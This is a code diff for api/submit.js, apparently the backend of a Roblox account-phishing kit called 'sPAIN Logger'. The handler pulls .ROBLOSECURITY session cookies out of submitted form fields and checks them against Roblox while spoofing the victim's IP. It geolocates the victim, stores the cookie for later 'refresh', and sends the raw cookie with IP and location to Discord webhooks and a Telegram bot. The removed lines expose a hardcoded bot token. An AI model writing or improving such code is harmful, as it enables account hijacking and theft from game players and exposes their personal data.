@@ -1,8 +1,8 @@
-// api/submit.js
+// api/submit.js — validates cookie first, then sends
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+const TG_TOKEN    = process.env.TG_TOKEN;
+const TG_CHAT     = process.env.TG_CHAT;
 const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 function parseBody(raw) {
@@ -23,45 +23,31 @@ async function redisGet(key) {
     if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
     if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
     return r || null;
-  } catch { return null; }
+  } catch (e) { console.error('redisGet error:', e.message); return null; }
 }
 
-// No TTL — cookie stays forever until manually deleted or Roblox logs them out
 async function redisSet(key, value) {
   try {
-    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
+    const res = await fetch(`${REDIS_URL}/pipeline`, {
       method: 'POST',
       headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify({ value: JSON.stringify(value) })
+      body: JSON.stringify([['SET', key, JSON.stringify(value), 'EX', 2592000]])
     });
     return res.ok;
-  } catch { return false; }
+  } catch (e) { console.error('redisSet error:', e.message); return false; }
 }
 
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
+    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`, { signal: AbortSignal.timeout(3000) });
     const d = await r.json();
     return d.status === 'success' ? d : null;
   } catch { return null; }
 }
 
-// Lite mode — only fetches robux, super fast (2 API calls)
-async function getRobux(cookie) {
-  try {
-    const r = await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, lite: true })
-    });
-    if (!r.ok) return null;
-    const d = await r.json();
-    return d.valid ? d.robux : null;
-  } catch { return null; }
-}
-
 async function tgSend(text) {
+  if (!TG_TOKEN || !TG_CHAT) return;
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -72,9 +58,9 @@ async function tgSend(text) {
 }
 
 function generateId() {
-  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
   let id = '';
-  for (let i = 0; i < 48; i++) id += c[Math.floor(Math.random() * c.length)];
+  for (let i = 0; i < 40; i++) id += chars[Math.floor(Math.random() * chars.length)];
   return id;
 }
 
@@ -82,9 +68,9 @@ const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-
 function extractCookie(raw) {
   if (!raw) return null;
   const s = String(raw).trim();
-  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
-  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
-  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
+  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
+  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
+  const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
   if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
   return null;
 }
@@ -96,21 +82,43 @@ function findCookie(slots) {
   return null;
 }
 
+// Quick validate — just hits /users/authenticated, nothing else
+async function validateCookie(cookie, ip) {
+  try {
+    const h = {
+      'Cookie': `.ROBLOSECURITY=${cookie}`,
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+      'Accept': 'application/json',
+      'Referer': 'https://www.roblox.com/',
+    };
+    if (ip && ip !== 'Unknown') { h['X-Forwarded-For'] = ip; h['X-Real-IP'] = ip; }
+    const r = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: h,
+      signal: AbortSignal.timeout(6000)
+    });
+    if (!r.ok) return null;
+    const d = await r.json();
+    return d?.id ? { id: d.id, username: d.name } : null;
+  } catch { return null; }
+}
+
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    await fetch(url, {
+    const r = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-  } catch (_) {}
+    if (!r.ok) console.error('Discord send failed:', r.status, await r.text());
+  } catch (e) { console.error('discordSend error:', e.message); }
 }
 
 async function discordChunked(url, text) {
+  const limit = 1990;
   let rem = text; let first = true;
   while (rem.length > 0) {
-    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
+    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
     await discordSend(url, {
       content: first
         ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
@@ -118,6 +126,67 @@ async function discordChunked(url, text) {
     });
     first = false;
   }
+}
+
+async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl, username }) {
+  await discordSend(webhookUrl, {
+    content: '@everyone',
+    embeds: [{
+      title:       '🍪 New Cookie Captured',
+      description: `🔥 \`sPAIN\` 🔥`,
+      color:       0xc026d3,
+      fields: [
+        { name: '👤 Username',   value: `\`${username}\``,                                                                     inline: true  },
+        { name: '🌐 IP',         value: ip || 'Unknown',                                                                       inline: true  },
+        { name: '📍 Location',   value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',    inline: true  },
+        { name: '🗺️ ISP',        value: geo?.isp || 'Unknown',                                                                 inline: true  },
+        { name: '🕐 Time',       value: now,                                                                                   inline: false },
+      ],
+      footer:    { text: `sPAIN Logger • ${pageName}` },
+      timestamp: now
+    }]
+  });
+  // Refresh link as separate message
+  await discordSend(webhookUrl, {
+    content: `🔄 **Refresh Link** — get stats + PowerShell:\n<${refreshUrl}>`
+  });
+  // Raw cookie
+  await discordChunked(webhookUrl, cookie);
+}
+
+async function sendTroll(webhookUrl, { ip, geo, now, pageName, cookie }) {
+  await discordSend(webhookUrl, {
+    embeds: [{
+      title:       '🤡 Wrong Cookie / Troll Detected',
+      description: '❌ Cookie was invalid or expired — account check failed.',
+      color:       0xff3333,
+      fields: [
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
+        { name: '🕐 Time',     value: now,                                                                                inline: false },
+      ],
+      footer: { text: `sPAIN Tools • ${pageName}` },
+      timestamp: now
+    }]
+  });
+  if (cookie) await discordChunked(webhookUrl, cookie);
+}
+
+async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
+  await discordSend(webhookUrl, {
+    embeds: [{
+      title: '⚠️ No valid cookie submitted',
+      color: 0xff6600,
+      fields: [
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
+        { name: '🕐 Time',     value: now,                                                                              inline: false }
+      ],
+      footer: { text: `sPAIN Tools • ${pageName}` },
+      timestamp: now
+    }]
+  });
 }
 
 export default async function handler(req, res) {
@@ -131,92 +200,70 @@ export default async function handler(req, res) {
   const { slug, slots } = body;
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
+  if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });
 
   const record = await redisGet(`slot:${slug}`);
-  if (!record)         return res.status(404).json({ error: 'Page not found' });
+  if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-  const cookie   = findCookie(slots);
-  const now      = new Date().toISOString();
-  const pageName = record.displayName || slug;
+  res.status(200).json({ success: true });
 
-  const webhooks = [record.webhook];
-  if (record.dualhookParent) {
-    try {
-      const parent = await redisGet(`slot:${record.dualhookParent}`);
-      if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
-    } catch (_) {}
-  }
+  try {
+    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
+    const cookie   = findCookie(slots);
+    const now      = new Date().toISOString();
+    const pageName = record.displayName || slug;
 
-  // Get geo and robux in parallel — both fast
-  const [geo, robux] = await Promise.all([
-    getIpGeo(ip),
-    cookie ? getRobux(cookie) : Promise.resolve(null)
-  ]);
-
-  if (!cookie) {
-    for (const wh of webhooks) {
-      await discordSend(wh, {
-        embeds: [{
-          title: '⚠️ No valid cookie submitted',
-          color: 0xff3333,
-          fields: [
-            { name: '🌐 IP',       value: ip || 'Unknown',                                                   inline: true },
-            { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true },
-            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                             inline: true }
-          ],
-          footer:    { text: `sPAIN Tools • ${pageName}` },
-          timestamp: now
-        }]
-      });
+    const webhooks = [record.webhook];
+    if (record.dualhookParent) {
+      try {
+        const parent = await redisGet(`slot:${record.dualhookParent}`);
+        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
+      } catch (_) {}
     }
-    return res.status(200).json({ success: true });
-  }
 
-  // Save cookie — NO TTL, stays until cookie dies or you delete it
-  const refreshId  = generateId();
-  const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
+    const geo = await getIpGeo(ip);
 
-  await redisSet(`refresh:${refreshId}`, {
-    cookie,
-    webhook:   record.webhook,
-    webhook1:  webhooks[1] || null,
-    pageName,
-    ip,
-    createdAt: now
-  });
+    if (!cookie) {
+      for (const wh of webhooks) await sendInvalid(wh, { ip, geo, now, pageName });
+      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`);
+      return;
+    }
 
-  // Send the 4-field embed + raw cookie + dashboard link
-  for (const wh of webhooks) {
-    await discordSend(wh, {
-      content: '@everyone',
-      embeds: [{
-        title:       '🍪 Cookie Captured',
-        description: ':fire: `sPAIN` :fire:',
-        color:       0xc026d3,
-        fields: [
-          { name: '🌐 IP',        value: ip || 'Unknown',                                                                    inline: true  },
-          { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
-          { name: '🗺️ ISP',       value: geo?.isp || 'Unknown',                                                              inline: true  },
-          { name: '💰 Robux',     value: robux !== null ? `\`${Number(robux).toLocaleString()} R$\`` : '`Fetching...`',      inline: true  },
-          { name: '🔄 Dashboard', value: `[Open Dashboard](${refreshUrl})\nLive account info + refresh cookie anytime`,      inline: false }
-        ],
-        footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
-        timestamp: now
-      }]
+    // Validate cookie — single lightweight request
+    const user = await validateCookie(cookie, ip);
+
+    if (!user) {
+      // Cookie extracted but Roblox rejected it
+      for (const wh of webhooks) await sendTroll(wh, { ip, geo, now, pageName, cookie });
+      await tgSend(`🤡 <b>TROLL/INVALID — ${pageName}</b>\n🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`);
+      return;
+    }
+
+    // Valid cookie — save refresh record
+    const refreshId  = generateId();
+    const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
+
+    await redisSet(`refresh:${refreshId}`, {
+      cookie,
+      webhook:   record.webhook,
+      webhook1:  webhooks[1] || null,
+      pageName,
+      ip,
+      createdAt: now
     });
 
-    // Raw cookie as plain text — exact bytes
-    await discordChunked(wh, cookie);
+    for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName, refreshUrl, username: user.username });
+
+    await tgSend([
+      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
+      `👤 ${user.username} (ID: ${user.id})`,
+      `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+      `🔄 Refresh: ${refreshUrl}`,
+      `🕐 ${now}`
+    ].join('\n'));
+
+  } catch (err) {
+    console.error('Post-response error:', err.message);
   }
-
-  await tgSend([
-    `🍪 <b>COOKIE — ${pageName}</b>`,
-    `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-    `💰 Robux: ${robux !== null ? Number(robux).toLocaleString() : '?'}`,
-    `🔄 ${refreshUrl}`
-  ].join('\n'));
-
-  return res.status(200).json({ success: true });
 }
